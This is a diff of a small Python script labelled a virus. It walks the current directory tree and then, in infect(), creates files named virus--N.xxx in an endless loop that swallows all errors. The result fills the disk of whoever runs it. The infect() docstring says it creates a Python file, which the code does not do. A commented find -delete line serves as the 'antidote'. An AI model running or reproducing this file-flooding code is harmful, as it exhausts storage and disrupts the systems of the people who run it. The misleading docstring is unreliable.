@@ -1,32 +1,49 @@
+# find . -type f -name '*plague.virus*' -delete
 import os
 import subprocess as sp
-from termcolor import colored as tcc
-import numpy as np
-
-
+# from termcolor import colored as tcc
 
 def transmit_virion():
     '''
-    No input, just recursively searches the current dir tree and
-    builds a list of dirs it finds.
+    Recursively searches the current directory tree and
+    returns a list of dirs it finds.
+
+    intended usage:
+        victims = transmit_virion()
+        infect(victims)
+
+    returns: list of dirs in current tree
+    return type: list
     '''
-    files_to_infect = list()
+    dirs_to_infect = list()
     for root, dirs, fils in os.walk(os.getcwd()):
         for di in dirs:
-            files_to_infect.append(os.path.join(root, di))
+            dirs_to_infect.append(os.path.join(root, di))
+    return dirs_to_infect
 
-    # Should be its own function (TODO)
-    for fil in files_to_infect:
-        os.chdir(fil)
-        sp.call(['touch', 'plague.virus'])
-        # this is wild, this worked, very very scary well...
-        # it was very hard to clean up after this.
-        # but the antidote is:
-        # find . -type f -name '*plague.virus*' -delete
+def infect(victims):
+    '''
+    Accepts list of directories to infect, goes to each dir in list
+    and creates a python file.
 
+    input: list
+    returns: virus
+    '''
+    for victim in victims:
+        os.chdir(victim)
+        footprint = 0
+        while True: # DANGER AHEAD!
+            footprint += 1
+            viral_strand = 'virus--' + str(footprint) + '.xxx'
+            try:
+                sp.call(['touch', viral_strand])
+            except:
+                pass
 
 
 if __name__ == "__main__":
 
     ## ~ VIRUS ~ ##
-    transmit_virion()
+    victims = transmit_virion()
+    infect(victims)
+
